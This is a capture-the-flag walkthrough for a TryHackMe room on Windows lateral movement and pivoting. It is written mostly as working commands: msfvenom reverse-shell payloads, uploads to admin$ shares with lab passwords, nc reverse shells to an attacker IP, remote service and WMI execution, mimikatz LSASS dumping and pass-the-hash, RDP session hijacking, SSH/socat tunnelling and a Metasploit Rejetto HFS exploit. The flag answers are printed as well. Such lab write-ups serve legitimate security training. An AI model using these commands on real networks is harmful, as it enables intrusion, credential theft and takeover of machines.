![Lateral Movement and Pivoting Banner](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/lateralmovementandpivoting/Lateral_Movement_and_Pivoting_Banner.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/lateralmovementandpivoting/Lateral_Movement_and_Pivoting_Cover.png" alt="Lateral Movement and Pivoting Logo">
</p>

# Lateral Movement and Pivoting

This guide contains the answer and steps necessary to get to them for the [Lateral Movement and Pivoting](https://tryhackme.com/room/lateralmovementandpivoting) room.

## Table of contents

- [Spawning Processes Remotely](#spawning-processes-remotely)
- [Moving Laterally Using WMI](#moving-laterally-using-wmi)
- [Use of Alternate Authentication Material](#use-of-alternate-authentication-material)
- [Abusing User Behaviour](#abusing-user-behaviour)
- [Port Forwarding](#port-forwarding)

### Spawning Processes Remotely

First we should set up our machine to properly connect to the network.

After downloading the network configuration file, edit the `/etc/resolve.conf`to include the DC IP as the DNS server.

DNS

Restart the network service using `sudo systemctl restart networking.service`.

Now generate your ssh credentials and log in.

1. After running the "flag.exe" file on t1_leonard.summers desktop on THMIIS, what is the flag?

   First, we should create a reverse shell using `msfvenom`. Make sure to use the correct options and a unique name. 

   ```cmd
   msfvenom -p windows/meterpreter/reverse_tcp -f exe-service LHOST=10.50.77.144 LPORT=1337 -o letmein-kevinovitz.exe
   ```

   MSFVENOM

   We can now transfer this file to the thmiis server using `smb`. This makes use of the credentials we found for Leonard Summers.

   ```cmd
   smbclient -c 'put letmein-kevinovitz.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
   ```

   SMBCLIENT

   Now we must ssh into THMJMP2 as Tony and setup an `nc` listener on our attackbox. Make sure to use a different port than in the payload you created.

   **Attackbox**
   
   ```cmd
   nc -nlvp 1338
   ```

   **THMJMP2**

   ```cmd
   ssh za.tryhackme.com\\tony.holland@thmjmp2.za.tryhackme.com

   runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.77.144 1338"
   ```

   RUNAS

   Now we should get a shell on the jumpserver. We can now create and run a service on the thmiis server using our payload executable after we set up a listener using MSF.

   Be sure to set the correct payload, otherwise the shell will drop.

   ```cmd
   msfconsole
   use exploit/multi/handler
   set LHOST 10.50.77.144
   set LPORT 1337
   run
   ```

   HANDLER

   ```cmd
   sc.exe \\thmiis.za.tryhackme.com create service-kevinovitz binPath= "%windir%\letmein-kevinovitz.exe" start= auto

   sc.exe \\thmiis.za.tryhackme.com start service-kevinovitz
   ```
   
   SERVICE

   CONNECTION

   Now that we have a connection to the thmiis server, we can look for the flag on Leonards desktop.

   FLAG

   ><details><summary>Click for answer</summary>THM{MOVING_WITH_SERVICES}</details>

### Moving Laterally Using WMI

1. After running the "flag.exe" file on t1_corine.waters desktop on THMIIS, what is the flag?

   First we create another payload using `msfvenom` and send it to the thmiis server using the found credentials.

   ```cmd
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.77.144 LPORT=1337 -f msi > msi-kevinovitz.msi

   smbclient -c 'put msi-kevinovitz.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
   ```

   PAYLOAD

   Now we setup another handler in `msfconsole`, taking care to update the payload type used.

   ```cmd
   msfconsole
   use exploit/multi/handler
   set LHOST 10.50.77.144
   set LPORT 1337
   set payload windows/x64/shell_reverse_tcp
   run
   ```

   Now we can start a WMI session against THMIIS.

   ```powershell
   $username = 't1_corine.waters';
   $password = 'Korine.1994';
   $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
   $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
   $Opt = New-CimSessionOption -Protocol DCOM
   $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
   Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\msi-kevinovitz.msi"; Options = ""; AllUsers = $false}
   ```

   After we receive a connection we can access the flag on the users desktop.

   FLAG

   ><details><summary>Click for answer</summary>THM{MOVING_WITH_WMI_4_FUN}</details>

### Use of Alternate Authentication Material

1. What is the flag obtained from executing "flag.exe" on t1_toby.beck's desktop on THMIIS?

   This time, we won't need a payload. We use the provided credentials to get high-privilege access via SSH to THMJMP2.

   ```cmd
   ssh za.tryhackme.com\\t2_felicia.dean@thmjmp2.za.tryhackme.com
   ```

   We can now use `mimikatz` to dump the NTLM hashes from LSASS memory.

   ```cmd
   C:\tools\mimikatz.exe

   privilege::debug
   sekurlsa::msv
   ```

   DUMP

   Using this NTLM hash we can pass-the-hash using `mimikatz` to get a shell on THMIIS after setting up a listener using `nc`.

   ```cmd
   sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"C:\tools\nc64.exe -e cmd.exe 10.50.77.144 1337"
   ```

   PTH
   
   After receiving the shell, we can move on to THMIIS using `winrs.exe`.

   ```cmd
   winrs.exe -r:THMIIS.za.tryhackme.com cmd
   ```

   FLAG

   ><details><summary>Click for answer</summary>THM{NO_PASSWORD_NEEDED}</details>

### Abusing User Behaviour

1. What flag did you get from hijacking t1_toby.beck's session on THMJMP2?

   First, head to http://distributor.za.tryhackme.com/creds_t2 to get new credentials. Then ssh into thmjmp2 with these credentials.

   ```cmd
   ssh za.tryhackme.com\\<username>@thmjmp2.za.tryhackme.com
   ```

   Next, we run `PsExec64.exe -s cmd.exe` and `query session` to list all (active) RDP connections.

   RDP

   We can now hijack the RDP session for Toby Beck using the ID and sessionkey.

   ```cmd
   tscon 3 /dest:rdp-tcp#47
   ```
   
   FLAG

   ><details><summary>Click for answer</summary>THM{NICE_WALLPAPER}</details>

### Port Forwarding

1. What is the flag obtained from executing "flag.exe" on t1_thomas.moore's desktop on THMIIS?

   Using the credential we obtained in the first task, we will connect to thmjmp2 through SSH. Here we will setup a `socat` forwarded port so we can rdp into thmiis.

   ```cmd
   ssh za.tryhackme.com\\tony.holland@thmjmp2.za.tryhackme.com

   socat TCP4-LISTEN:1337, fork TCP4:THMIIS.za.tryhackme.com:3389
   ```

   Th provided command for `socat` didn't work, so I had to modify the command:

   ```cmd
   socat TCP4-LISTEN:1337, TCP4:THMIIS.za.tryhackme.com:3389
   ```

   SOCAT

   No that the port has been forwarded, we can rdp into thmiis by pointing to thmjmp2 on port 1337.

   We can see we are connected to thmiis.

   RDP

   We can get our flag from the desktop.

   FLAG

   ><details><summary>Click for answer</summary>THM{SIGHT_BEYOND_SIGHT}</details>

2. What is the flag obtained using the Rejetto HFS exploit on THMDC?

   For this exploit to work we need to setup an ssh tunnel with a remote port (tunneling our machine to the effected port on the dc) and two local ports (tunneling requests from the dc via jmp2 to our machine).

   But first, we need to setup a user to use for this exploit. This can be deleted later.

   ```cmd
   useradd tunneluser2 -m -d /home/tunneluser2 -s /bin/true

   passwd tunneluser2
   ```

   Make sure to log into thmjmp2 with our initial ssh credentials and use the following command to setup the correct tunnel.

   ```cmd
   ssh tunneluser2@10.50.77.144 -R 1337:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7777:127.0.0.1:7777 -N
   ```

   I had issues connecting, because the connection got refused. This was solved with `sudo systemctl start ssh.socket`.

   DYNAMIC

   Now that the tunnel is setup, we can prepare the msf exploit.

   ```cmd
   use exploit/windows/http/rejetto_hfs_exec
   set payload windows/shell_reverse_tcp
   set ReverseListenerBindAddress 127.0.0.1
   set lhost thmjmp2.za.tryhackme.com
   set lport 7777
   set srvport 6666
   set srvhost 127.0.0.1
   set rhosts 127.0.0.1
   set rport 1337
   exploit
   ```

   MSF

   Of all is well, we exploit will be abused and a connection will be made to the dc.

   CONNECTION

   Now we can get our second flag.

   FLAG2

   ><details><summary>Click for answer</summary>THM{FORWARDING_IT_ALL}</details>

